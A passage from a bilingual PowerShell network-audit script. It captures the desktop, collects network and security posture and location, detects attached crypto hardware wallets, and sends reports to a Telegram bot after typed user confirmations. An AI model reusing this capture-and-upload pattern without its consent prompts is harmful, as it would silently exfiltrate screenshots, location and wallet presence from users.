        if($remaining.Length -gt 0){$result.Add($remaining)}
        return @($result)
    }

    $expanded=New-Object 'System.Collections.Generic.List[object]'
    foreach($entry in @($Lines)) {
        $kind=[string]$entry.kind
        $limit=if($kind -eq 'section'){50}else{64}
        foreach($piece in @(_WrapOverlayText ([string]$entry.text) $limit)) {
            $expanded.Add([pscustomobject]@{kind=$kind;text=$piece})
        }
    }

    # Screenshot is always opt-in. Never replace a failed capture with a fake screenshot.
    $permission=Read-Host 'Capture YOUR VISIBLE desktop now? Type CAPTURE / Для снимка экрана введите CAPTURE'
    if($permission -cne 'CAPTURE') { throw 'Screen capture cancelled; no screenshot created or sent.' }

    $bmp=$null; $g=$null
    $rawPath=[IO.Path]::Combine([IO.Path]::GetDirectoryName($FilePath),([IO.Path]::GetFileNameWithoutExtension($FilePath) + '_raw.png'))
    try {
        $vs=[System.Windows.Forms.SystemInformation]::VirtualScreen
        if($vs.Width -le 0 -or $vs.Height -le 0) { throw 'Invalid virtual-screen bounds; use an unlocked interactive Windows desktop.' }
        Write-Host ('Capturing desktop region: '+$vs.Width+'x'+$vs.Height+' at '+$vs.Left+','+$vs.Top) -ForegroundColor Cyan
        $bmp=[System.Drawing.Bitmap]::new($vs.Width,$vs.Height,[System.Drawing.Imaging.PixelFormat]::Format32bppArgb)
        $g=[System.Drawing.Graphics]::FromImage($bmp)
        $g.CopyFromScreen($vs.Left,$vs.Top,0,0,$bmp.Size,[System.Drawing.CopyPixelOperation]::SourceCopy)
        $bmp.Save($rawPath,[System.Drawing.Imaging.ImageFormat]::Png)
        if(-not (Test-Path -LiteralPath $rawPath) -or (Get-Item -LiteralPath $rawPath).Length -lt 1000) {
            throw 'Raw screenshot not saved or suspiciously small.'
        }
        Write-Host ('RAW DESKTOP SCREENSHOT saved: '+$rawPath) -ForegroundColor Green
    } catch {
        if($g){$g.Dispose();$g=$null}
        if($bmp){$bmp.Dispose();$bmp=$null}
        throw ('ACTUAL SCREEN CAPTURE FAILED: '+$_.Exception.Message+'; unlock the desktop and run in your interactive Windows session.')
    }

    $titleFont=$null;$headFont=$null;$bodyFont=$null;$smallFont=$null
    $whiteBrush=$null;$mutedBrush=$null;$accentBrush=$null;$warnBrush=$null;$shadowBrush=$null
    $panelBrush=$null;$titleBarBrush=$null;$badgeBrush=$null;$linePen=$null;$edgePen=$null
    try {
        $g.SmoothingMode=[System.Drawing.Drawing2D.SmoothingMode]::AntiAlias
        $g.TextRenderingHint=[System.Drawing.Text.TextRenderingHint]::ClearTypeGridFit

        $titleFont=[System.Drawing.Font]::new('Segoe UI',22,[System.Drawing.FontStyle]::Bold)
        $headFont=[System.Drawing.Font]::new('Consolas',14,[System.Drawing.FontStyle]::Bold)
        $bodyFont=[System.Drawing.Font]::new('Consolas',12,[System.Drawing.FontStyle]::Regular)
        $smallFont=[System.Drawing.Font]::new('Segoe UI',10,[System.Drawing.FontStyle]::Regular)

        $whiteBrush=[System.Drawing.SolidBrush]::new([System.Drawing.Color]::FromArgb(245,247,250))
        $mutedBrush=[System.Drawing.SolidBrush]::new([System.Drawing.Color]::FromArgb(196,205,219))
        $accentBrush=[System.Drawing.SolidBrush]::new([System.Drawing.Color]::FromArgb(85,235,195))
        $warnBrush=[System.Drawing.SolidBrush]::new([System.Drawing.Color]::FromArgb(255,201,92))
        $shadowBrush=[System.Drawing.SolidBrush]::new([System.Drawing.Color]::FromArgb(55,0,0,0))
        $panelBrush=[System.Drawing.SolidBrush]::new([System.Drawing.Color]::FromArgb(188,11,18,28))
        $titleBarBrush=[System.Drawing.SolidBrush]::new([System.Drawing.Color]::FromArgb(215,20,30,45))
        $badgeBrush=[System.Drawing.SolidBrush]::new([System.Drawing.Color]::FromArgb(230,21,122,93))
        $linePen=[System.Drawing.Pen]::new([System.Drawing.Color]::FromArgb(95,92,118,148),1)
        $edgePen=[System.Drawing.Pen]::new([System.Drawing.Color]::FromArgb(170,62,83,110),2)

        $panelWidth=[Math]::Min(860,[Math]::Max(680,$bmp.Width-90))
        $x=35; $y=35
        $panelHeight=132
        foreach($line in $expanded) {
            $h=if($line.kind -eq 'section'){28}elseif($line.kind -eq 'divider'){12}else{21}
            $panelHeight += $h
        }
        $panelHeight += 42
        if($panelHeight -gt ($bmp.Height-70)) { $panelHeight = $bmp.Height-70 }

        $panelRect=[System.Drawing.Rectangle]::new($x,$y,$panelWidth,$panelHeight)
        $titleRect=[System.Drawing.Rectangle]::new($x,$y,$panelWidth,62)
        $badgeRect=[System.Drawing.Rectangle]::new(($x+$panelWidth-155),($y+12),122,38)

        $g.FillRectangle($shadowBrush,($x+6),($y+7),$panelWidth,$panelHeight)
        $g.FillRectangle($panelBrush,$panelRect)
        $g.DrawRectangle($edgePen,$panelRect)
        $g.FillRectangle($titleBarBrush,$titleRect)
        $g.DrawString('NETWORK SECURITY AUDITOR', $titleFont, $whiteBrush, ($x+18), ($y+13))
        $g.DrawString('live screen overlay / поверх скриншота', $smallFont, $mutedBrush, ($x+22), ($y+43))

        $g.FillRectangle($badgeBrush,$badgeRect)
        $g.DrawString(("{0}/100" -f $Score), $headFont, $whiteBrush, ($badgeRect.X+12), ($badgeRect.Y+10))
        $g.DrawString($Grade, $smallFont, $whiteBrush, ($badgeRect.X+74), ($badgeRect.Y+11))


        $cursorY=$y+78
        foreach($line in $expanded) {
            switch($line.kind) {
                'section' {
                    $g.DrawLine($linePen,($x+18),($cursorY+3),($x+$panelWidth-18),($cursorY+3))
                    $g.DrawString([string]$line.text, $headFont, $accentBrush, ($x+18), ($cursorY+6))
                    $cursorY += 28
                }
                'divider' {
                    $g.DrawLine($linePen,($x+18),($cursorY+6),($x+$panelWidth-18),($cursorY+6))
                    $cursorY += 12
                }
                default {
                    $brush=if(([string]$line.text) -match 'CRITICAL|ВЫСОК|HIGH|RISK|ATTENTION|WARNING'){ $warnBrush } else { $whiteBrush }
                    $g.DrawString([string]$line.text, $bodyFont, $brush, ($x+24), $cursorY)
                    $cursorY += 21
                }
            }
            if($cursorY -gt ($y+$panelHeight-40)) { break }
        }

        $stampText='Generated: '+(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
        $g.DrawString($stampText,$smallFont,$mutedBrush,($x+18),($y+$panelHeight-26))
        $g.DrawString('Sensitive desktop content may be visible in the screenshot.', $smallFont, $mutedBrush, ($x+280), ($y+$panelHeight-26))

        $bmp.Save($FilePath,[System.Drawing.Imaging.ImageFormat]::Png)
        if(-not (Test-Path -LiteralPath $FilePath) -or (Get-Item -LiteralPath $FilePath).Length -lt 1000) {
            throw 'Overlay screenshot not saved or suspiciously small.'
        }
        Write-Host ('OVERLAY SCREENSHOT saved: '+$FilePath) -ForegroundColor Green
    }
    finally {
        foreach($obj in @($g,$bmp,$titleFont,$headFont,$bodyFont,$smallFont,$whiteBrush,$mutedBrush,$accentBrush,$warnBrush,$shadowBrush,$panelBrush,$titleBarBrush,$badgeBrush,$linePen,$edgePen)) {
            if($obj -and ($obj -is [System.IDisposable])) { try { $obj.Dispose() } catch {} }
        }
    }
}
function Send-TgPhoto([string]$Path) {
    if(-not ($SendTelegram -and $SendReportImage) -or -not (Test-Path -LiteralPath $Path)){return}
    Write-Host ('SCREENSHOT PREVIEW: '+$Path) -ForegroundColor Yellow
    try { Start-Process -FilePath $Path -ErrorAction Stop | Out-Null } catch { Write-Warning ('Preview unavailable: '+$_.Exception.Message) }
    $decision=Read-Host ('Send this VISIBLE-DESKTOP screenshot to Telegram chat IDs '+$TelegramChatIds+'? Type SEND / Отправить? Введите SEND')
    if($decision -cne 'SEND') { Write-Host 'Screen image not sent to Telegram (you declined).' -ForegroundColor Yellow; return }
    $http=New-Object System.Net.Http.HttpClient
    try {
        foreach($chatId in (Tg-TargetIds)) {
            $form=$null
            try {
                $form=New-Object System.Net.Http.MultipartFormDataContent
                $form.Add(([System.Net.Http.StringContent]::new([string]$chatId)),'chat_id')
                $form.Add(([System.Net.Http.StringContent]::new('Network Security Auditor | network security summary / Сводка безопасности')),'caption')
                $content=[System.Net.Http.ByteArrayContent]::new([byte[]][IO.File]::ReadAllBytes($Path))
                $content.Headers.ContentType=[System.Net.Http.Headers.MediaTypeHeaderValue]::new('image/png')
                $form.Add($content,'photo',[IO.Path]::GetFileName($Path))
                $response=$http.PostAsync("https://api.telegram.org/bot${TelegramBotToken}/sendPhoto",$form).GetAwaiter().GetResult()
                $response.EnsureSuccessStatusCode() | Out-Null
                if(-not $script:sentTo.Contains([string]$chatId)){$script:sentTo.Add([string]$chatId)}
            } catch {
                $clean=$_.Exception.Message.Replace($TelegramBotToken,'[BOT_TOKEN_REDACTED]')
                $script:telegramFailures.Add("Chat $chatId screenshot image: $clean")
            } finally { if($null -ne $form){$form.Dispose()} }
        }
    }finally{$http.Dispose()}
}

if($TestScreenshotOnly) {
    Write-Host 'SCREENSHOT SELF-TEST. No network scan and NO Telegram upload.' -ForegroundColor Cyan
    $selfTestFile=Join-Path $OutputDir ('screen_test_'+$stamp+'_overlay.png')
    $selfTestRows=@(
        [pscustomobject]@{kind='section';text='SCREEN CAPTURE SELF-TEST / ПРОВЕРКА СНИМКА'},
        [pscustomobject]@{kind='row';text=('Windows desktop screenshot / Скриншот Windows')},
        [pscustomobject]@{kind='row';text=('Time / Время: '+(Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))},
        [pscustomobject]@{kind='row';text='This is a visual test, NOT a security audit.'}
    )
    try {
        New-AuditPng $selfTestFile $selfTestRows 0 'TEST'
        Write-Host ('Screen test overlay: '+$selfTestFile) -ForegroundColor Green
        Write-Host ('Screen test raw: '+([IO.Path]::Combine([IO.Path]::GetDirectoryName($selfTestFile),([IO.Path]::GetFileNameWithoutExtension($selfTestFile)+'_raw.png')))) -ForegroundColor Green
        Start-Process -FilePath $selfTestFile
    } catch { Write-Error ('Screen test failed: '+$_.Exception.Message) }
    return
}

if($TestTelegramOnly) {
    $SendTelegram=$true
    if([string]::IsNullOrWhiteSpace($TelegramBotToken)){
        Write-Warning 'Set TG_BOT_TOKEN or pass -TelegramBotToken first.'
        return
    }
    if(@(Tg-TargetIds).Count -eq 0){Write-Warning 'No valid Telegram chat IDs';return}
    Send-Tg '<b>✅ Network Security Auditor</b> - Telegram connection test / Проверка связи'
    if($sentTo.Count -gt 0){Write-Host ('Telegram OK: '+($sentTo.ToArray() -join ', ')) -ForegroundColor Green}
    if($telegramFailures.Count -gt 0){foreach($failure in $telegramFailures.ToArray()){Write-Warning $failure}}
    return
}

Write-Host 'Network Security Auditor | local, read-only audit' -ForegroundColor Cyan
Write-Host '[1/6] Interfaces, gateway, WAN IP, GeoIP' -ForegroundColor Cyan
$route=Safe { Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction Stop | Where-Object {$_.NextHop -ne '0.0.0.0'} | Sort-Object RouteMetric,InterfaceMetric | Select-Object -First 1 } 'Default route'
$adapter=$null;$config=$null
if ($route) {
    $adapter=Safe { Get-NetAdapter -InterfaceIndex $route.InterfaceIndex } 'Adapter'
    $config=Safe { Get-NetIPConfiguration -InterfaceIndex $route.InterfaceIndex } 'IP configuration'
}
$gateway=if($route){OneLine $route.NextHop}else{'unknown'}
$allAdapters=Safe { @(Get-NetAdapter | Select-Object Name,InterfaceDescription,Status,LinkSpeed,MacAddress,InterfaceIndex) } 'Adapters list'
$dnsList=@()
if($route) { $dnsList=@(Safe { (Get-DnsClientServerAddress -InterfaceIndex $route.InterfaceIndex).ServerAddresses | Where-Object {$_} } 'DNS settings' | Where-Object {$_}) }
$ipv4=if($config){@($config.IPv4Address | ForEach-Object {$_.IPv4Address})}else{@()}
$ipv6=if($config){@($config.IPv6Address | ForEach-Object {$_.IPv6Address} | Where-Object {$_ -notlike 'fe80:*'})}else{@()}
$publicV4=Safe { Get-TextUrl 'https://api4.ipify.org' } 'Public IPv4'
$publicV6=Safe { Get-TextUrl 'https://api6.ipify.org' } 'Public IPv6'
$geo=$null
if($publicV4) { $geo=Safe { Get-JsonUrl ("https://ipwho.is/{0}" -f [uri]::EscapeDataString($publicV4)) } 'GeoIP lookup' }
$intel=$null
if($publicV4) {
    if($IpIntelApiKey) {
        $intel=Safe { Get-JsonUrl ("https://api.ipapi.is/?q=$([uri]::EscapeDataString($publicV4))&key=$([uri]::EscapeDataString($IpIntelApiKey))") } 'IP risk intelligence'
    } else {
        $intel=Safe { Get-JsonUrl ("https://api.ipapi.is/?q={0}" -f [uri]::EscapeDataString($publicV4)) } 'IP/ASN intelligence'
    }
}
$isp=if($geo -and $geo.connection){OneLine $geo.connection.isp}else{'unknown'}
$asn=if($geo -and $geo.connection){OneLine $geo.connection.asn}else{'unknown'}
$company=if($intel){if($intel.company -is [string]){$intel.company}else{OneLine $intel.company.name}}else{'unknown'}
$net=@{
 public_ipv4=$publicV4;public_ipv6=$publicV6
 location=@{
  country_code=if($geo){$geo.country_code}else{$null};country=if($geo){$geo.country}else{$null}
  region=if($geo){$geo.region}else{$null};city=if($geo){$geo.city}else{$null}
  street='Cannot be determined from public IP';house='Cannot be determined from public IP'
  postal=if($geo){$geo.postal}else{$null}
  timezone=if($geo -and $geo.timezone){$geo.timezone.id}else{$null}
  accuracy='approximate, not a verified physical address'
 }
 isp=$isp;asn=$asn;registered_company=$company
 vpn=Get-IntelBoolean $intel 'is_vpn'
 proxy=Get-IntelBoolean $intel 'is_proxy'
 tor=Get-IntelBoolean $intel 'is_tor'
 datacenter=Get-IntelBoolean $intel 'is_datacenter' 
 active_adapter=if($adapter){$adapter.Name}else{$null}
 adapter_description=if($adapter){$adapter.InterfaceDescription}else{$null}
 link_speed=if($adapter){[string]$adapter.LinkSpeed}else{$null}
 local_ipv4=@($ipv4);local_ipv6=@($ipv6)
 gateway=$gateway;dns_configured=@($dnsList)
 all_adapters=@($allAdapters)
}
Write-Host '[1a/6] Optional device location (Windows permission + user confirmation)' -ForegroundColor Cyan
$deviceLocation=Get-WindowsLocation
$net.device_location=$deviceLocation
Write-Host ('Device location: '+$deviceLocation.status+$(if($deviceLocation.status -eq 'OK'){' (accuracy ~'+$deviceLocation.accuracy_m+' m)'}else{''})) -ForegroundColor Yellow
Write-Host '[1b/6] VPN / Proxy / Tor local state and Tor Project exit list' -ForegroundColor Cyan
$vpnDiagnostics=Get-VpnStatus $allAdapters $adapter $intel
$proxyDiagnostics=Get-ProxyStatus
$torDiagnostics=Get-TorStatus $publicV4 $intel
# An IP reputation flag describes the IP, not necessarily an enabled local proxy.
$proxyIntelStatus=if($null -eq $net.proxy){'UNKNOWN (IP intelligence key required)'}elseif($net.proxy){'PUBLIC PROXY EXIT FLAGGED'}else{'NOT FLAGGED'}
$net.vpn_diagnostics=$vpnDiagnostics
$net.proxy_diagnostics=$proxyDiagnostics
$net.proxy_exit_ip_intelligence=$proxyIntelStatus
$net.tor_diagnostics=$torDiagnostics
$os=Safe { Get-CimInstance Win32_OperatingSystem | Select-Object -ExpandProperty Caption } 'Operating system'

Write-Host '[2/6] Wi-Fi, latency, router reachability and heuristics' -ForegroundColor Cyan
$wifi=@{signal_percent=$null;channel=$null;connection='not Wi-Fi or unavailable'}
$wlan=Safe { (& netsh wlan show interfaces 2>$null | Out-String) } 'Wi-Fi netsh'
if($wlan) {
    if($wlan -match '(?im)^\s*(?:Signal|Сигнал)\s*:\s*(\d+)\s*%') {$wifi.signal_percent=[int]$Matches[1];$wifi.connection='Wi-Fi connected'}
    if($wlan -match '(?im)^\s*(?:Channel|Канал)\s*:\s*(\d+)') {$wifi.channel=[int]$Matches[1]}
}
$pingWan=Ping-Sample '1.1.1.1' 3
$pingGate=if($gateway -ne 'unknown'){Ping-Sample $gateway 3}else{$null}
$gatewayPorts=[ordered]@{}
if($CheckGatewayPorts -and $gateway -ne 'unknown') {
    foreach($p in @(21,22,23,80,443,8080,8443)) { $gatewayPorts["$p"]=(Tcp-Connect $gateway $p) }
}
$bottleneck=New-Object 'System.Collections.Generic.List[string]'
if($wifi.signal_percent -ne $null -and $wifi.signal_percent -lt 55){$bottleneck.Add('Weak Wi-Fi signal: likely local radio bottleneck')}
if($pingGate -and $pingGate.avg_ms -ne $null -and $pingGate.avg_ms -gt 15){$bottleneck.Add('High gateway RTT: local Wi-Fi/router/congestion suspected')}
if($pingWan.loss_percent -gt 0 -and $pingGate -and $pingGate.loss_percent -eq 0){$bottleneck.Add('WAN ICMP loss while gateway responds; check ISP/upstream (ICMP may be filtered)')}
if($adapter -and [string]$adapter.LinkSpeed -match '^(10|100)\s*Mbps'){ $bottleneck.Add('Low nominal link speed; check cabling/negotiation') }
if($bottleneck.Count -eq 0){$bottleneck.Add('No obvious local bottleneck from small samples; throughput not measured')}
$gatewayMac=$null;$dhcpServer=$null
if($route){
    $neigh=Safe { Get-NetNeighbor -AddressFamily IPv4 -InterfaceIndex $route.InterfaceIndex -IPAddress $gateway -ErrorAction Stop | Select-Object -First 1 } 'Router neighbor MAC'
    if($neigh){$gatewayMac=$neigh.LinkLayerAddress}
    $nicInfo=Safe { Get-CimInstance Win32_NetworkAdapterConfiguration -Filter ("InterfaceIndex={0}" -f $route.InterfaceIndex) | Select-Object -First 1 } 'DHCP/router info'
    if($nicInfo){$dhcpServer=$nicInfo.DHCPServer}
}
$net.router_mac=$gatewayMac;$net.dhcp_server=$dhcpServer
$net.wifi=$wifi;$net.ping_1111=$pingWan;$net.ping_gateway=$pingGate
$net.gateway_port_reachability=$gatewayPorts
$net.bottleneck_heuristics=$bottleneck.ToArray()

Write-Host '[3/6] System DNS, browser DNS and WebRTC STUN/ICE probes' -ForegroundColor Cyan
$systemDnsId=Get-DnsId
$dnsLeak=Get-DnsProbe $systemDnsId $true
$browserDnsId=''
$browserDns=[ordered]@{status='skipped';observed_resolvers=@();vendor_conclusion=$null;provider_reported_ip=$null;note='Browser DNS test was skipped'}
$webrtc=[pscustomobject]@{status='skipped';error='Browser test was skipped';candidates=@();browser_dns_probe_attempts=0}
if(-not $SkipBrowserTest){
    $browserDnsId=Get-DnsId
    $webrtc=Get-WebRtcBrowserTest $browserDnsId
    if($webrtc.browser_dns_probe_attempts -gt 0){
        $browserDns=Get-DnsProbe $browserDnsId $false
    }else{$browserDns.status='inconclusive: browser DNS test did not execute';$browserDns.note='Browser tab may not have opened or browser blocked probes'}
}
$webrtcPublicCandidates=@($webrtc.candidates | Where-Object {$_.type -eq 'srflx' -and (Is-PublicV4 $_.address)} | Select-Object -ExpandProperty address -Unique)
$webrtcMismatch=@($webrtcPublicCandidates | Where-Object {$publicV4 -and $_ -ne $publicV4})
$webrtcHostIPs=@($webrtc.candidates | Where-Object {$_.type -eq 'host' -and $_.address -notmatch '(?i)\.local$'} | Select-Object -ExpandProperty address -Unique)
$expectedDns=@($ExpectedDnsResolverIPs -split '[,;\s]+' | Where-Object {$_})
$observedResolverIPs=@($dnsLeak.observed_resolvers | ForEach-Object {$_.ip})
$dnsDeviation=@($observedResolverIPs | Where-Object {$expectedDns.Count -gt 0 -and $_ -notin $expectedDns})
$leak=[ordered]@{
 system_dns=$dnsLeak;browser_dns=$browserDns;
 system_dns_expected_ipv4=@($expectedDns);system_dns_outside_expected_resolvers=@($dnsDeviation);
 dns_baseline_warning='Upstream resolver egress addresses may differ from configured DNS IPs; interpret expected-IP mismatches cautiously. VPN split-DNS and browser DoH can differ.';
 webrtc=$webrtc;webrtc_public_ipv4_candidates=@($webrtcPublicCandidates);
 webrtc_mismatched_public_ipv4=@($webrtcMismatch);webrtc_host_ip_candidates=@($webrtcHostIPs);
 vpn_expected_public_ipv4=$ExpectedVpnPublicIPv4
}
Write-Host '[4/6] Windows security and connected hardware wallets' -ForegroundColor Cyan
$firewall=Safe { @(Get-NetFirewallProfile | Select-Object Name,Enabled,DefaultInboundAction,DefaultOutboundAction) } 'Windows Firewall'
$secureBoot=Safe { Confirm-SecureBootUEFI } 'Secure Boot'
$bitlocker=Safe { @(Get-BitLockerVolume | Select-Object MountPoint,VolumeStatus,ProtectionStatus,EncryptionPercentage) } 'BitLocker'
$defender=Safe { Get-MpComputerStatus | Select-Object AMServiceEnabled,AntivirusEnabled,RealTimeProtectionEnabled,AntispywareEnabled,AntivirusSignatureLastUpdated } 'Defender'
$winUpdate=Safe { Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 1 HotFixID,InstalledOn } 'Windows hotfix'
$listenerRows=Safe { @(Get-NetTCPConnection -State Listen | Where-Object {$_.LocalAddress -in @('0.0.0.0','::')} | Select-Object LocalAddress,LocalPort,OwningProcess -Unique) } 'Local listeners'
$sensitivePorts=@(21,23,135,139,445,3389,5900,5985,5986,8080)
$exposedListeners=@($listenerRows | Where-Object {$_.LocalPort -in $sensitivePorts})
$walletReport=Get-HardwareWalletStatus
Write-Host ('VPN:    '+(Status-Text $vpnDiagnostics.status)) -ForegroundColor Yellow
Write-Host ('Proxy:  '+(Status-Text $proxyDiagnostics.status)) -ForegroundColor Yellow
Write-Host ('Tor:    '+(Status-Text $torDiagnostics.status)) -ForegroundColor Yellow
Write-Host ('Ledger: '+(Status-Text $walletReport.ledger.status)) -ForegroundColor Yellow
Write-Host ('Trezor: '+(Status-Text $walletReport.trezor.status)) -ForegroundColor Yellow
$wallets=@($walletReport.ledger.devices)+@($walletReport.trezor.devices)
$windows=@{
 os=$os;firewall=@($firewall);secure_boot=$secureBoot;bitlocker=@($bitlocker)
 defender=$defender;latest_hotfix=$winUpdate
 inbound_listening_sensitive_ports=@($exposedListeners)
 ledger_trezor_attached=@($wallets)
 hardware_wallets=$walletReport
 note='Wallet presence only; no wallet software, addresses, PINs, private keys or seed phrases read'
}

Write-Host '[5/6] Evidence-based local risk scoring' -ForegroundColor Cyan
if($firewall) {
    $off=@($firewall | Where-Object {$_.Enabled -eq $false})
    if($off.Count -gt 0) {Add-Finding 'high' ('Брандмауэр выключен для профилей: '+(($off.Name) -join ', ')) ('Firewall disabled in profiles: '+(($off.Name) -join ', ')) 18}
} else {Add-Finding 'unknown' 'Статус брандмауэра не получен' 'Firewall status unavailable' 0}
if($secureBoot -eq $false){Add-Finding 'medium' 'Secure Boot отключён' 'Secure Boot is disabled' 8}
if($null -eq $secureBoot){Add-Finding 'unknown' 'Secure Boot не удалось проверить (UEFI/права)' 'Secure Boot unavailable (UEFI/permissions)' 0}
if($bitlocker) {
    $osDrive=($env:SystemDrive + '\')
    $systemVolume=@($bitlocker | Where-Object {($_.MountPoint -eq $osDrive) -or ($_.MountPoint -eq $env:SystemDrive)}) | Select-Object -First 1
    if($systemVolume -and [string]$systemVolume.ProtectionStatus -ne 'On') {Add-Finding 'medium' 'Защита BitLocker системного диска не включена' 'OS drive BitLocker protection is not on' 12}
} else {Add-Finding 'unknown' 'BitLocker не удалось проверить' 'BitLocker status unavailable' 0}
if($defender -and $defender.RealTimeProtectionEnabled -eq $false) {
    Add-Finding 'high' 'Защита Defender в реальном времени выключена (возможен другой антивирус)' 'Defender real-time protection off (third-party AV may be present)' 15
}
if(-not $defender){Add-Finding 'unknown' 'Defender не удалось проверить' 'Defender status unavailable' 0}
if(@($exposedListeners | Where-Object {$_.LocalPort -eq 23}).Count -gt 0){Add-Finding 'high' 'Локально прослушивается Telnet TCP/23; проверьте назначение и правила входа' 'Telnet TCP/23 is listening; verify necessity and firewall reachability' 15}
if(@($exposedListeners | Where-Object {$_.LocalPort -eq 3389}).Count -gt 0){Add-Finding 'medium' 'RDP TCP/3389 прослушивается; проверьте NLA, VPN и ACL' 'RDP TCP/3389 listening; review NLA, VPN and ACL' 7}
if(@($exposedListeners | Where-Object {$_.LocalPort -eq 445}).Count -gt 0){Add-Finding 'info' 'SMB TCP/445 слушает на всех интерфейсах; проверьте сегментацию' 'SMB TCP/445 listening on all interfaces; verify segmentation' 0}
if($gatewayPorts.Contains('23') -and $gatewayPorts['23']){Add-Finding 'high' 'На шлюзе отвечает Telnet TCP/23 в локальной сети' 'Gateway Telnet TCP/23 reachable from LAN' 15}
if($wifi.signal_percent -ne $null -and $wifi.signal_percent -lt 45){Add-Finding 'low' 'Слабый Wi-Fi сигнал' 'Weak Wi-Fi signal' 3}
if($webrtcMismatch.Count -gt 0){Add-Finding 'medium' 'WebRTC обнаружил публичный IP, отличный от HTTP egress; требуется проверка маршрутов' 'WebRTC returned a public IP different from HTTP egress; investigate egress paths' 9}
if($dnsLeak.status -like 'unavailable*' -or $dnsLeak.status -like 'inconclusive*' -or $dnsLeak.status -eq 'no_test_id'){Add-Finding 'unknown' 'Проверка системных DNS-резолверов не дала результата' 'System DNS resolver test inconclusive' 0}
if($browserDns.status -like 'unavailable*' -or $browserDns.status -like 'inconclusive*' -or $browserDns.status -eq 'skipped' -or $browserDns.status -eq 'no_test_id'){Add-Finding 'unknown' 'Браузерная проверка DNS не выполнена или не дала результата' 'Browser DNS test inconclusive or skipped' 0}
if($dnsDeviation.Count -gt 0){Add-Finding 'medium' 'Часть системных DNS-резолверов вне указанного списка ожидаемых IP (проверьте anycast и VPN)' 'Observed upstream DNS IPs differ from provided baseline (verify anycast/VPN)' 7}
if($ExpectedVpnPublicIPv4 -and $publicV4 -and $publicV4 -ne $ExpectedVpnPublicIPv4){Add-Finding 'high' 'Публичный HTTP IPv4 не совпадает с ожидаемым IPv4 VPN' 'HTTP IPv4 does not match user-provided VPN egress IPv4' 15}
if($webrtcHostIPs.Count -gt 0){Add-Finding 'info' 'WebRTC показывает локальные IP внутри браузера; оцените настройки приватности' 'WebRTC exposes host IPs inside this browser; review privacy settings' 0}
if($webrtc.status -ne 'finished' -or @($webrtc.candidates).Count -eq 0){Add-Finding 'unknown' 'Тест WebRTC не дал достаточно ICE-кандидатов для вывода' 'WebRTC did not provide enough ICE candidates for a conclusion' 0}
if(-not $publicV4 -or -not $route){Add-Finding 'unknown' 'Нет подтверждённой IPv4-связности или маршрута по умолчанию' 'IPv4 connectivity/default route not confirmed' 0}
if($net.vpn -eq $null){Add-Finding 'unknown' 'Классификация публичного IP как VPN/Proxy/Tor недоступна без IPAPI_IS_KEY; локальные проверки выполнены отдельно' 'Public IP VPN/Proxy/Tor reputation unavailable without IPAPI_IS_KEY; local checks ran separately' 0}
if($walletReport.ledger.status -eq 'UNKNOWN' -or $walletReport.trezor.status -eq 'UNKNOWN'){Add-Finding 'unknown' 'Не удалось получить достоверный список USB/PnP устройств Ledger/Trezor' 'Ledger/Trezor present-device inventory unavailable' 0}
$score=100
foreach($f in $findings){$score-=[int]$f.penalty}
$score=[math]::Max(0,[math]::Min(100,$score))
$tier=if($score -ge 85){'GOOD / ХОРОШО'}elseif($score -ge 65){'REVIEW / ТРЕБУЕТ ВНИМАНИЯ'}else{'HIGH RISK / ВЫСОКИЙ РИСК'}
$unknownCount=@($findings | Where-Object {$_.level -eq 'unknown'}).Count
$confidence=if($unknownCount -gt 3){'LOW / НИЗКАЯ'}else{'MODERATE / СРЕДНЯЯ'}
if($unknownCount -gt 3 -and $score -ge 85){$tier='INCOMPLETE / НЕДОСТАТОЧНО ДАННЫХ'}
$assessment=[ordered]@{
 score_heuristic_0_to_100=$score;grade=$tier;confidence=$confidence
 warning='Heuristic posture score, not a penetration test or guarantee of safety'
 findings=$findings.ToArray()
 local_summary_ru="Оценка: $score/100 ($tier), достоверность: $confidence. Проверены текущий ПК, локальный шлюз и внешние сервисы. Количество проблем: $(@($findings.ToArray() | Where-Object {$_.penalty -gt 0}).Count). Неизвестный результат НЕ означает безопасность. Оценка по правилам, не пентест."
 local_summary_en="Score: $score/100 ($tier), confidence: $confidence. Scope: this PC, local gateway, external services. Penalized findings: $(@($findings.ToArray() | Where-Object {$_.penalty -gt 0}).Count). Unknown does NOT mean safe. Rule-based posture assessment, not a pentest."
}

$assessment.local_summary_ru += (' VPN: '+(Status-Text $vpnDiagnostics.status)+'; Proxy: '+(Status-Text $proxyDiagnostics.status)+'; Tor: '+(Status-Text $torDiagnostics.status)+'. Ledger: '+(Status-Text $walletReport.ledger.status)+'; Trezor: '+(Status-Text $walletReport.trezor.status)+'.')
$assessment.local_summary_en += (' VPN: '+$vpnDiagnostics.status+'; Proxy: '+$proxyDiagnostics.status+'; Tor: '+$torDiagnostics.status+'. Ledger: '+$walletReport.ledger.status+'; Trezor: '+$walletReport.trezor.status+'.')

$telegramLocationPermission=$false
if($SharePreciseLocationInTelegram -and $deviceLocation.status -eq 'OK' -and $SendTelegram) {
    Write-Host ('WARNING: precise device location will be sent to '+(Tg-TargetIds -join ', ')) -ForegroundColor Yellow
    $confirmShare=Read-Host 'Share exact GPS/Wi-Fi coordinates and approximate street via Telegram? Type SHARE / Отправить точные координаты? SHARE'
    if($confirmShare -ceq 'SHARE'){$telegramLocationPermission=$true}
}
$report=[ordered]@{schema='network-audit-v4';generated_at=(Get-Date).ToString('o');network=$net;leak_checks=$leak;windows_security=$windows;assessment=$assessment;collection_errors=$errorsList.ToArray()}
$jsonPath=Join-Path $OutputDir ("network_audit_${stamp}.json")
($report | ConvertTo-Json -Depth 16) | Set-Content -Path $jsonPath -Encoding UTF8
# A separate attachment is redacted by default. Local JSON can contain precise location.
$jsonTelegramPath=$jsonPath
if($deviceLocation.status -eq 'OK' -and -not $telegramLocationPermission) {
    $jsonTelegramPath=Join-Path $OutputDir ("network_audit_${stamp}_telegram_redacted.json")
    $safeCopy=($report | ConvertTo-Json -Depth 16 | ConvertFrom-Json)
    $safeCopy.network.device_location.latitude=$null
    $safeCopy.network.device_location.longitude=$null
    $safeCopy.network.device_location.street=$null
    $safeCopy.network.device_location.house_number=$null
    $safeCopy.network.device_location.postcode=$null
    $safeCopy.network.device_location.city=$null
    $safeCopy.network.device_location.approximate_address=$null
    $safeCopy.network.device_location.note='Precise location was withheld from Telegram; full details remain in local JSON.'
    ($safeCopy | ConvertTo-Json -Depth 16) | Set-Content -Path $jsonTelegramPath -Encoding UTF8
}

